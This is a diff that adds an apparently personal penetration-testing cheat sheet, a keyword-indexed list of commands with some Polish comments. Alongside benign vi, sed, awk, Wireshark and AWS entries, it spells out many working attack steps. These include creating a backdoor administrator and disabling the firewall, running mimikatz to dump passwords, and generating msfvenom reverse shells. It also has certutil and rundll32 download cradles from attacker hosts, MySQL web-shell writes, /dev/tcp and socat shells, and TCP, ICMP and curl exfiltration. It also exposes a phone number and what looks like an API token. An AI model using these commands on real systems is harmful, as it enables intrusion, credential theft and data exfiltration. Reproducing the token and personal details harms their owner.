@@ -1,0 +1,705 @@
+
+
+
+
+menu, chisel
+menu, curl
+menu, dig
+menu, download
+menu, email
+menu, ffuf
+menu, find
+menu, git
+menu, gobuster
+menu, grep
+menu, ip
+menu, iptables
+menu, lfi
+menu, merlin
+menu, msfvenom
+menu, mysql
+menu, nikto
+menu, nmap
+menu, nslookup
+menu, passwd
+menu, priv
+menu, python
+menu, sed
+menu, sockat
+menu, spawn
+menu, sshuttle
+menu, tar
+menu, tmux
+menu, tor
+menu, vi
+menu, windows
+menu, wireshark
+menu, wpscan
+menu, xfreerdp
+menu, exfiltration
+menu, zeek
+menu, aws
+menu, windwsID
+menu, setfacl
+menu, shell
+my, mka.hopto.org
+my, noip.com
+my, ssh 55522
+tel, 07429322354
+
+windows, net user hacker hackP@ssw0rd /add
+windows, net localgroup administrators hacker /add
+windows, netsh advfirewall set allprofiles state off
+windows, net localgroup "Remote Desktop Users" Everyone /Add
+windows, Invoke-WebRequest "http://1.1.1.1/mimikatz.exe" -outfile "mimikatz.exe"
+windows, .\mimikatz "log host-31.log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
+windows, Invoke-WebRequest "http://1.1.1.1/applocker-bypas-checker.ps1.txt" -outfile "applocker-bypas-checker.ps1"
+windows, .\ applocker-bypas-checker.ps1
+windows, sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=16666 -f dll -o kavremoverENU.dll
+windows, net user /domain
+windows, crackmapexec smb 10.200.x.0/24 -u <user> -d <domain> -H <hash>
+windows, evil-winrm -i <address> -u <user> -H <hash>
+windows, https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md.
+windows, https://github.com/HackLikeAPornstar/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1.
+windows, https://github.com/GhostPack/Seatbelt       Seatbelt-master\Seatbelt-master\Seatbelt\bin\Debug
+windows, https://github.com/PwnDexter/SharpEDRChecker/releases/tag/1.1
+windows, certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+windows, certutil -encode payload.exe Encoded-payload.txt
+windows, bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
+windows, findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
+windows, certutil -decode Encoded_file payload.txt
+windows, explorer.exe /root,"C:\Windows\System32\calc.exe"   -> In order to create a child process of explorer.exe parent, we can execute the following command:
+windows, wmic.exe process call create calc
+windows, rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
+windows, rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
+windows, bash.exe -c "path-to-payload"
+windows,  -- "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f
+windows, -- icacls c:\Users\sage\service.exe /grant Everyone:F  jest wazne czasami exe moze nie dzialac bo sa rights    !!!!!!!!!!!!!!!
+
+
+
+windows, sudo python3 ntlmrelayx.py -t smb://10.200.107.30 -smb2support -socks    and then on windows nslookup DC-SRV01
+windows, /usr/share/doc/python3-impacket/examples/smbclient.py anonymous:aonymous@1.1.1.1
+windows, Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
+windows,  Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
+windows, takeown /F "C:\PS" - To make yourself the owner of, for example, the C:\PS directory, enter the following command:
+windows, dir c:\ps /q You can display the current owner of a folder or all nested objects with the command:
+windows, Get-Acl "C:\PS\ip_list.txt" | Select-Object Owner
+windows, Get-ChildItem C:\ps -recurse | ForEach-Object{Get-Acl $_.FullName|select path,owner}
+windows, takeown /F "C:\permissions.log " /S lonPC2213.theitbros.com
+windows, icacls c:\ps\* /setowner bjackson /T /C /L /Q
+windows, ICACLS <filename> /grant administrators:F - assign file permissions
+windows, ICACLS <filename> /grant %username%:F
+windows, ICACLS <filename> /grant John:F
+windows, takeown /f <foldername>
+windows, takeown /f <foldername> /a
+windows, takeown /f <foldername> /r /d y
+windows, TAKEOWN /F <foldername> /a /r /d y
+windows, icacls <foldername> /grant administrators:F /T
+windows, icacls "file_or_folder_name" /setowner "NT Service\TrustedInstaller"
+windows, icacls "D:\Annual Reports\2020\November" /setowner "John"
+windows, icacls "D:\Tax Audit\November.xlsx" /setowner "John"
+windows, icacls "D:\Tax Audit\November.xlsx" /setowner "Administrators"
+windows, icacls "folder_name" /setowner "Administrators" /T
+windows, icacls "path\filename" /setowner "NT Service\TrustedInstaller"
+windows, icacls "C:\Windows\PolicyDefinitions\WindowsStore.admx" /setowner "NT Service\TrustedInstaller"
+windows, fsutil.exe hardlink list C:\Windows\notepad.exe
+windows, good link to change permission https://www.winhelponline.com/blog/take-ownership-of-file-or-folder/
+windowd, "C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"
+windows, smb smbserver.py share . -smb2support -username mka -password mka
+windows, smb net use \\10.14.32.90\share /u:mka  mka
+windows, smb net use M: \\10.10.14.15\share /user:mka mka
+windows, sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
+windows, mimikatz  !+
+windows, mimikatz   !processprotect /process:lsass.exe /remove
+windows, mimikatz    privilege::debug
+windows, mimikatz     privilege::debug           OR sekurlsa::logonpasswords
+windows, 
+windows, runas /savecred /user:THM.red\thm-local cmd.exe     to figure out user paht use 'cmdkey /list'
+windows, powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+windows, ntdsutil.exe ->  python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
+
+windows, post sending file curl -d @exfil.zip http://huntmeplz.com:8080/
+vnc, nie ma usera attackuje bez usera
+vnc, hydra  -P /opt/rockyou.txt vnc://10.10.48.55 -V
+vnc, zeby sie polaczyc to przez remmina
+sshuttle, apt-get install sshuttle
+sshuttle, sudo sshuttle -D -N -r linux-admin:linuxrulez@10.200.107.33 -x 10.200.107.33 10.200.107.0/24 -vvv
+sshuttle, nie dawaj haslo bo bedzie cetyfikat do potwierdzenia 
+
+date, date +'%s'  epoc format
+
+passwd, openssl passwd -6 --salt mka111 "mka111"   ->  $6$mka111$t2M0va0gq5BlWVz0TLbyRDlplsnQdkCj/NAXOgLY06lxJZMlm.CHTdys.VxySXRV1Y./4Kg2ypvB3t7aDqMcH1
+passwd, USERNAME:HASH:0:0::/root:/bin/bash
+passwd, mka:$6$mka$t2M0va0gq5BlWVz0TLbyRDlplsnQdkCj/NAXOgLY06lxJZMlm.CHTdys.VxySXRV1Y./4Kg2ypvB3t7aDqMcH1:0:0::/root:/bin/bash
+
+mysql, select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
+mysql, select load_file("/etc/passwd");
+mysql, ! ls -l
+mysql, ! bash
+mysql, union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET['cmd']);?&gt;",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+mysql, union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),
+
+
+vi, 3yy - Yank (copy) three lines
+vi, y$ - Yank (copy) everything from the cursor to the end of the line.
+vi, y^ - Yank (copy) everything from the cursor to the start of the line.
+vi, yw - Yank (copy) to the start of the next word.
+vi, yiw – Yank (copy) the current word.
+vi, y% - Yank (copy) to the matching character. By default supported pairs are (), {}, and []. Useful to copy text between matching brackets.
+vi, dd - Delete (cut) the current line, including the newline character.
+vi, 3dd - Delete (cut) three lines, starting from the line where the cursor is positioned,
+vi, d$ - Delete (cut) everything from the cursor to the end of the line.
+vi, 
+
+wireshark, tshark -r capture.pcapng -Y 'http.user_agent' | grep -w '9ab62b5' | grep -v 'HTTP 166' | awk '{print $9}' | sed 's/q=/ /g' | awk '{print $2}'  
+
+ffuf, ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://1.1.1.1/FUZZ -o 80-directory.txt
+ffuf, ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://1.1.1.1/FUZZ -e  .txt,.php,.bk,.conf  -o 80-filex.txt
+ffuf, ffuf -u http://1.1.1.1.1  -H "Host: FUZZ.holo.live" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -o 80-subdomain.txt 
+ffuf, ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://1.1.1.1/secret/FUZZ.txt -fc 403
+ffuf, ffuf -w vhostnames.txt -u https://target -H "Host: FUZZ. target" -acc "www"
+ffuf, ffuf -w <path-wordlist> -u http://1.1.1.1.1/FUZZ -e .aspx,.php,.txt,.html
+ffuf, ffuf -u https://1.1.1.1/FUZZ -w <path-wordlist> -recursion
+ffuf, ffuf -u http://1.1.1.1/FUZZ/ -w <path-wordlist> -p 1    -> every second
+
+awk, |awk '{print($4)}' | awk '{s+=$1} END {print s}'   adding 
+awk, dc -f <(awk -F, '{print $2}' file.csv) -e '[+z1<r]srz1<rp'     
+awk, awk '{print NR,$0}' employee.txt 
+awk, awk 'NR==3, NR==6 {print NR,$0}' employee.txt    -> Another use of NR built-in variables (Display Line From 3 to 6)  
+awk, awk 'NF < 0' geeksforgeeks.txt           -> To print any non empty line if present  
+awk, awk '{ if (length($0) > max) max = length($0) } END { print max }' geeksforgeeks.txt     -> To find the length of the longest line present in the file
+awk, awk '{ if($3 == "B6") print $0;}' geeksforgeeks.tx             -> To find/check for any string in any specific column
+awk, awk 'BEGIN { for(i=1;i<=6;i++) print "square of", i, "is",i*i; }' 
+awk, https://www.geeksforgeeks.org/linux-unix/awk-command-unixlinux-examples/
+
+tmux,  Ctrl - r to search 
+
+
+msfvenom, msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=443 -f elf > reverse.elf
+msfvenom, msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.1.1.1 LPORT=443 -f elf > shell.elf
+msfvenom, msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=443 VERBOSE=true -f ps1 -o meterpreter.ps
+msfvenom, msfvenom -p php/meterpreter_reverse_tcp LHOST=1.1.1.1  LPORT=443 -f raw > shell.php
+msfvenom, cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+msfvenom, msfvenom -p windows/shell_reverse_tcp LHOST=1.1.1.1  LPORT=2222 -f exe > mysqld.exe
+msfvenom, 
+msfvenom, msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=1.1.1.1 -f dll -a x86 > live0fftheland.dll  ->  set payload windows/meterpreter/reverse_tcp 
+msfvenom, c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll  
+msfvenom, c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
+msfvenom,
+msfvenom, git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
+msfvenom, msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
+msfvenom, msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
+msfvenom, python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
+msfvenom, c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
+msfvenom, sessions -u -1 upgrade the last opened session to Meterpreter
+msfvenom, Socks Proxy use auxiliary/server/socks_proxy
+msfvenom, Socks Proxy run srvhost=127.0.0.1 srvport=9050 version=4a
+msfvenom, Socks Proxy curl --proxy socks4a://localhost:9050 http://10.10.114.28
+msfvenom, Socks Proxy proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 10.10.114.28
+msfvenom, 
+msfvenom, 
+msfvenom, 
+msfvenom, 
+msfvenom, 
+msfvenom, 
+
+
+curl,  curl http://86.131.55.212:8888/log.tar  --proxy http://bastion:3128
+curl, curl -F 'file=@test.txt' http://86.131.55.212:7777 --proxy http://bastion:3128
+curl, curl http://192.168.171.183/exiftest.php   -F myFile=@example.jpg
+curl, curl http://exfiltrated.offsec/ -s | html2text | tail
+
+
+priv, /etc/doas.conf
+priv, /etc/systemd
+priv, /etc/fstab
+priv,getfacl system/zeno-monitoring.service 
+
+
+find, find -type f -maxdepth 1 -writable
+find, find / -perm /u=s
+find, find / -type f ! -perm 777
+find, find /tmp -type f -empty
+find, find /tmp -type f -name ".*" # File all Hidden Files
+find, find / -mtime +50 –mtime -100 # . Find Last 50-100 Days Modified Files
+find, find / -amin -60 # Find Accessed Files in Last 1 Hour
+find, find / -size +50M -size -100M # Find Size between 50MB – 100MB
+find, find / -type f -size +100M -exec rm -f {} \; #  Find and Delete 100MB Files
+find, find . -exec ls {} \;
+find, find . -ea 
+find, find / -type f -perm -04000 -ls 2>/dev/null
+
+
+
+python, proxies={"http":"http://127.0.0.1:8080"}
+python, /usr/bin/python3.7 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’
+python, __import__('os').system('ping 10.11.48.49-c3')#
+tar, tar -rvf tar -f file.tar --delete file1 file2 , removing
+tar, tar -rvf archive.tar newfile adding
+tar, tar -xf archive.tar file1 file2 extracting specif 
+tar, tar -xf archive.tar file1 file2 listing tar chrives
+tar, # tar -xf file_name.tar -C /target/directory
+tar, # tar -xf file_name.tar.gz --directory /target/directory
+tar, tar --extract --file=tecmintbackup.tar.gz tecmintbackup.xml
+tar, tar -xvf Phpfiles-org.tar --wildcards '*.php'
+tar, 
+
+spawn, python3 -c "__import__('pty').spawn('/bin/bash')"
+spawn, python -c 'import pty;pty.spawn("/bin/bash")'
+spawn, python3 -c 'import pty;pty.spawn("/bin/bash")'
+spawn, stty raw -echo && fg 
+spawn, export TERM=xterm-256color &&  export SHELL=/bin/bash && stty cols 198 rows 48
+spawn, export TERM=xterm-256color 
+spawn, export SHELL=bash 
+spawn, 
+spawn, SHELL=/bin/bash script -q /dev/null 
+spawn, Ctrl-Z 
+spawn, stty raw -echo 
+spawn,fg 
+spawn, reset 
+spawn, xterm
+spawn, stty cols 198 rows 48
+
+chisel, ./chisel server -p 8000 -reverse -v 
+chisel, ./chisel client 1.1.1.1:8000 R:22:127.0.0.1:22
+chisel, ./chisel client 1.1.1.1:8000 R:3000:127.0.0.1:3000
+chisel, ./chisel client 1.1.1.1:8000 R:5000:127.0.0.1:5000
+chisel, Dynamic server /chisel server -p 12000 --reverse  ;;;;   client 10.50.70.97:12000 R:socks &  ;;    proxychains.conf socks5 127.0.0.1 1080 tylko ;; 
+chisel, Dunamic proxychains -q nmap -sT -Pn -p 22,80 -sV -sC , proxychains -q curl http://127.0.0.1:80,   proxychains -q mysql -h 192.168.100.1 -u admin -p
+
+sed, sed -i 's/192.168.1.152/192.169.10.13/' exploit.py 
+sed, sed  -i '11 s/upload =/#upload =/' exploit.py   
+sed, sed -e '/socks4/s/^/#/g' -i /etc/proxychains.conf 
+sed, sed -i "30i system('whoami')" exploit.py 
+sed, sed -e 's/\(.*\)/\L\1/' input.txt > output.txt 
+sed, sed -e 's/\(.*\)/\U\1/' input.txt > output.txt 
+sed, sed '3 a\ dodaje po 
+sed, sed '1 i\ ' dodaje przed 
+sed, test.txt | sed -n '10-15p' drukuje linie
+sed, test.txt | sed -n '11p' 
+sed, sed -n -e 5,8p -e 10p file  -> prints specific lines
+sed, sed -n -e 5p -e 8p file
+sed, sed, cat -n text.txt | sed '9,12!d'
+sed, cat conn.log | sed '7,$!d' to drukuje tylko od 7 lini do konca
+sed, sed '7d;12d;16d' input.txt To delete specified lines from the input.txt file, use:
+sed, sed '5,8d' input.txt Delete Range of Lines
+sed, sed -i '/^$/d' input.txt Delete Empty Line
+sed, sed '/Hard/d' input.txt Delete if Line Matches Pattern
+sed, sed -i '/hard/I d' input.txt ed performs simple string matching, so the matching is case-sensitive. If you want to perform a case-insensitive search, use the I flag:
+sed, sed '/1991/!d' input.txt Delete Lines Not Matching Pattern
+sed, sed -i '/^1/d' file.txt elete Line if it Starts With Specified Character or Character
+sed, duzo przykladow https://phoenixnap.com/kb/sed-delete-line
+
+
+grep, grep -oP "(?<=wireshark,\s).*(?=)"   -> w koncu bierze wszystko do zaczyna sie na wiershark spacja i wtedy moj string do konca
+grep, grep -oh "\w*.dll" dll.txt
+grep,  grep -rwn '/var/' -i '^\$2y\$\w*'
+grep, grep -x '.\{8,20\}' > 8-20_length_wordlist 
+grep, grep -o '[^ ]*[a-z][^ ]*' > contains_lowercase.txt 
+grep, grep -o '[^ ]*[A-Z][^ ]*' > contains_uppercase.txt 
+grep, grep -o '[^ ]*[0-9][^ ]*' > contains_numbers.txt 
+grep, grep -v "^[A-Za-z0-9]*$" > contains_special.txt 
+grep,  grep -o "FLAG{.*}" f.01
+grep, cat u  | grep -P -i  '\d+-\d+-\d+'
+grep, grep -oP "href=\"([^\"]+)" -> to pokazuje wszystkie linki z plimku website
+grep, grep -v -e 'test1' -e 'test2' Display lines that don't match one or both "test1" and "test2" strings.
+
+
+
+download,  curl http://0.0.0.0/pspy64  -o pspy64  &
+download,  curl http://0.0.0.0/linpeas.sh  -o linpeas.sh  &
+download,  curl http://0.0.0.0/chisel/chisel  -o chisel  &
+download,  curl http://0.0.0.0/lse.sh  -o lse.sh &
+download,  curl http://0.0.0.0/ncat  -o ncat  &
+download,  curl http://0.0.0.0/socat  -o socat &
+download, sudo nc -q 5 -lvnp 80 < linpeas.sh #Host     cat < /dev/tcp/1.1.1.1/80 | sh #Victim
+download, nc -lvnp 9002 | tee linpeas.out #Host        curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
+
+
+
+sockat, openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
+sockat, cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
+sockat, socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
+sockat, "socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash."
+sockat, c29jYXQgT1BFTlNTTDoxMC4yMC4zMC4xOjQ0NDMsdmVyaWZ5PTAgRVhFQzovYmluL2Jhc2guCg==
+
+merlin, go run main.go
+merlin, Export GOOS=linux;export GOARCH=amd64; go build -ldflags "-s -w -X main.url=//192.168.0.11:443" -o shell.elf main.go
+merlin, GOOS=windows GOARCH=amd64 go build -ldlags "-X main.url=//192.168.0.11:443" -o shell.exe main.go
+merlin, listeners -> use http2 -> start -> set PSK SecurePSK!23@456
+merlin, ./merlin_agent -url 'https://[IP_ADDR_OF_MERLIN_SERVER]:443 -psk '[PSK_YOU_CREATED_FOR_LISTENER]'
+
+
+ip, wget -qO - https://api.ipify.org; echo
+ip, wget -qO- https://ipecho.net/plain ; echo
+ip, curl https://ipinfo.io/ip
+ip, sudo ip addr add 192.168.1.50/24 dev eth0 && sudo ip route add default via 192.168.1.1
+ip, sudo ip link set <interface> up.
+ip, ip route add default via 192.0.2.2 dev eth0
+
+tor, torsocks wget -qO - https://api.ipify.org; echo
+tor, source torsocks on ### Tor mode activated. Every command will be torified for this shell.
+tor, echo ". torsocks on" >> ~/.bashrc
+email, https://toolbox.googleapps.com/apps/messageheader/analyzeheader
+email, https://mha.azurewebsites.net/
+email, mailheader.org.
+email,  https://ipinfo.io/
+email, https://urlscan.io/
+email, https://talosintelligence.com/reputation
+email, https://www.convertcsv.com/url-extractor.htm
+email, https://talosintelligence.com/talos_file_reputation
+email, https://app.any.run/
+email, https://www.joesecurity.org/
+email, notice that the tool notifies us that 'Reply-To no present' although it provides the alternative header information, Return-Path.
+email, https://www.phishtool.com/
+email, to get conent of attachment from wireshark use fileter imf.content.typ
+xfreerdp, xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3 +clipboard
+xfreerdp, xfreerdp /v:ip_address /u:username /p:password /cert:ignore
+xfreerdp, xfreerdp /v:ip_address /u:username /p:password +clipboard
+xfreerdp, xfreerdp /v:ip_address /u:username /p:password /dynamic-resolutionxfreerdp, xfreerdp /u:username /p:password /v:ip_address /sound:sys:alsa 
+
+
+msfvenom, msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
+
+nmap, nmap -sC -sV -oN nmap.txt 1.1.1.1 -Pn 
+nmap, nmap -p- 1.1.1.1 --open -Pn
+nmap, nmap -r -v --min-rate 1000 -p- 1.1.1.1
+nmap, nmap -sU --top-ports 20 -sC -sV -Pn 1.1.1.1
+nmap, cat ports.txt  | grep open | grep -oE '^[0-9]+[///]' | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$/ /g'
+nmap, nmap --script=vuln --script-args http.useragent="<USER AGENT HERE>" 1.1.1.1
+nmap, user agent can be found on https://developers.whatismybrowser.com/useragents/explore/
+nmap, s also possible to evade detection by using SYN (-sS) or "stealth" scan mode
+nmap, nmap -vv -sV -O - script=vuln -p 1883 1.1.1.1
+ffuf, ffuf -u https://codingo.io/W1 -w ./wordlist.txt:W1
+ffuf, ffuf -u https://W2/W1 -w ./wordlist.txt:W1,./domains.txt:W2 
+ffuf, 
+gobuster, gobuster dns -d "blurry.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100    
+gobuster, gobuster dir -u http://1.1.1.1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt -o gobuster.txt
+gobuster, gobuster dir -u http://1.1.1.1 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -x php,txt -o gobuster.txt
+gobuster, gobuster dns   -r 1.1.1.1 -d 'mka.com'  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+gobuster, gobuster vhost -u https://example.com -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+gobuster, extra -t 4 --delay 1s  -b 500,403 -o results.txt
+
+
+nikto, nikto -host 1.1.1.1 -C all
+
+
+lfi, /proc/self/environ 
+lfi, ../../../var/log/apache2/access.log 
+lfi, test.php?file=php://filter/convert.base64-encode/resource=config.php
+wpscan, wpscan --url http://wordy -e u,vp --plugins-detection aggressive --api-token jjQiNs5vrX03k07Tv0YsrIPTDgsnpslQpUHaXDg2FUY
+iptables, iptables -L --line-numbers
+iptables, sudo iptables -L -nv
+iptables, sudo iptables -D INPUT 10
+iptables,  sudo iptables -I INPUT 3 -p tcp --dport 443 -j ACCEPT
+iptables, sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3000
+iptables, iptables  -I OUTPUT 1 -p tcp --dst 143.204.191.0/24 -j DROP
+iptables, sudo iptables -t nat -A OUTPUT -p tcp --dport 3333 -j REDIRECT --to-port 5555   => to dziala
+iptables, sudo iptables -t nat -L -n -v  to see rule    => to dziala
+iptables, sudo iptables -t nat -D OUTPUT 1    remove only line 1  => to dzila
+
+
+
+
+git, git diff --summary b972b3d 2acba1c
+git, git log
+git, git log --oneline
+git, git remote -v - shows the linked repository
+git, git log --abbrev-commit --graph --pretty=oneline
+git, git branch -a -vv
+
+
+
+dig, dig -t AXFR redteam.thm @10.10.150.117
+dig, dig txt wp.pl  - to check spf
+dig, dig ns yahoo.com
+dig, dig a yahoo.com
+nslookup, nslookup -type=txt wp.pl
+
+wireshark, http.server contains "Apache"
+wireshark, http.host matches "\.(php || html)"
+wireshark, tcp.port in {80 443 8080}
+wireshark, upper(http.server) contains "APACHE"
+wireshark, lower(http.server) contains "apache"
+wireshark, string(frame.number) matches "[13579]$"
+wireshark, (http.response.code == 200 ) && (http.content_type matches "image(gif||jpeg)")
+wireshark, tcp.flags == 2 -> Only SYN flag.
+wireshark, tcp.flags.syn == 1 -> SYN flag is set. The rest of the bits are not important.
+wireshark, tcp.flags == 16 -> Only ACK flag.
+wireshark, tcp.flags.ack == 1 -> ACK flag is set. The rest of the bits are not important.
+wireshark, tcp.flags == 18 -> Only SYN, ACK flags.
+wireshark, (tcp.flags.syn == 1) and (tcp.flags.ack == 1) -> SYN and ACK are set. The rest of the bits are not importan
+wireshark, tcp.flags == 4 -> Only RST flag.
+wireshark, tcp.flags.reset == 1 -> RST flag is set. The rest of the bits are not important.
+wireshark, tcp.flags == 20 -> Only RST, ACK flags.
+wireshark, (tcp.flags.reset == 1) and (tcp.flags.ack == 1 -> RST and ACK are set. The rest of the bits are not important.
+wireshark, tcp.flags == 1 -> Only FIN flag
+wireshark, tcp.flags.fin == 1 -> FIN flag is set. The rest of the bits are not important
+
+
+
+exfiltration, TCP socket   nc -lvp 8080 > /tmp/task4-creds.data 
+exfiltration, TCP Socket   tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
+exfiltration, TCP Socket   nc -lnvp > task4-creds.tar  and then dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
+exfiltration, using SSH    tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
+exfiltration, curl         curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php 
+exfiltration, curl         sudo sed -i 's/ /+/g' /tmp/http.bs64
+exfiltration, curl         cat /tmp/http.bs64 | base64 -d | tar xvfz - 
+exfiltration, Generating encrypted Tunneling Clients       python3 neoreg.py generate -k thm  
+exfiltration, Generating encrypted Tunneling Clients       python3 neoreg.py -k thm -u http://MACHINE_IP/uploader/files/tunnel.php
+exfiltration, Http tunneling curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
+exfiltration, Http tunneling python3 neoreg.py -k thm -u http://MACHINE_IP/uploader/files/tunnel.php
+exfiltration, ICMP    sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
+exfiltration, ICMP    sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
+exfiltration, 
+
+
+zeek, docker run -it -v `pwd`:/pcap broplatform/bro:4.2.0 /bin/bash
+zeek, zeek -C -r sample.pcap 
+zeek, cat signatures.log | zeek-cut uid src_addr dst_addr
+zeek, zeek -C -r sample.pcap -s sample.sig  -> option -s to signature file
+zeek, cat dns.log | zeek-cut -u -d ts id.orig_h id.resp_h query qclass qclass_name qtype qtype_name answers
+zeek, sudo docker run -v /investigation/2022-01-03:/pcap  -it zeekurity/zeek 
+sort, sort -k 3 -t , -n -r  cheese.csv
+sort, sort -k 2 -t , cheese.csv
+sort, sort -k 2 -t , cheese.csv
+sort, sort | uniq -c 
+cut, cut -f2 file.txt - to jest najlatwiesze zeby wydrucoeac columneA
+
+linux, check session last -f /var/log/wtmp
+
+aws, aws ec2 describe-instances --filters Name=instance-state-name,Values=running --output table 
+aws, aws ec2 describe-instances --filters Name=instance-state-name,Values=running --query "Reservations[*].Instances[*].InstanceId" --output text
+aws, aws ec2 describe-instances --instance-ids i-1234567890abcdef0
+aws, aws ec2 describe-instances     --instance-ids i-0da6edcee61744ec6 --filters Name=tag-key,Values=Name     --query 'Reservations[*].Instances[*].{Instance:InstanceId,AZ:Placement.AvailabilityZone,Name:Tags[?Key==`Name`]|[0].Value}'     --output table
+aws, ws ec2 describe-instances --instance-ids i-0da6edcee61744ec6  --query 'Reservations[*].Instances[*].{Instance:InstanceId,Subnet:SubnetId,VPC:VpcId,SecurityGroups:SecurityGroups[*].GroupId}'
+aws, aws  ec2 describe-security-groups --group-ids sg-0a024534204a9b4c7
+aws, aws ec2 create-security-group --group-name MySecurityGroup --description "My security group" --vpc-id vpc-1a2b3c4d
+aws, aws ec2 authorize-security-group-ingress --group-id sg-0a024534204a9b4c7 --protocol tcp --cidr 0.0.0.0/0 --port 4444
+aws, export AWS_PROFILE=user1
+aws, get ip public aws ec2 describe-instances   --filters Name=instance-state-name,Values=running   --query 'Reservations[*].Instances[*].{Instance:InstanceId,PublicIPAddress:PublicIpAddress}'
+aws, aws ec2 import-key-pair --key-name "abc" --public-key-material fileb://mka.pub
+aws, aws ec2 create-internet-gateway --query InternetGateway.InternetGatewayId --output text
+aws, aws ec2 attach-internet-gateway --vpc-id vpc-2f09a348 --internet-gateway-id igw-1ff7a07b
+aws, aws ec2 create-route-table --vpc-id vpc-2f09a348 --query RouteTable.RouteTableId --output text
+aws, aws ec2 create-route --route-table-id rtb-c1c8faa6 --destination-cidr-block 0.0.0.0/0 --gateway-id igw-1ff7a07b
+aws, aws ec2 describe-route-tables --route-table-id rtb-c1c8faa6
+aws, aws ec2 describe-route-tables --route-table-id rtb-c1c8faa6
+aws, aws ec2 describe-subnets --filters "Name=vpc-id,Values=vpc-2f09a348" --query "Subnets[*].{ID:SubnetId,CIDR:CidrBlock}"
+aws, aws ec2 associate-route-table  --subnet-id subnet-b46032ec --route-table-id rtb-c1c8faa6
+aws, aws ec2 modify-subnet-attribute --subnet-id subnet-b46032ec --map-public-ip-on-launch
+aws, aws ec2 create-key-pair --key-name MyKeyPair --query "KeyMaterial" --output text > MyKeyPair.pem
+aws, aws ec2 create-security-group --group-name SSHAccess --description "Security group for SSH access" --vpc-id vpc-2f09a348
+aws, aws ec2 authorize-security-group-ingress --group-id sg-e1fb8c9a --protocol tcp --port 22 --cidr 0.0.0.0/0
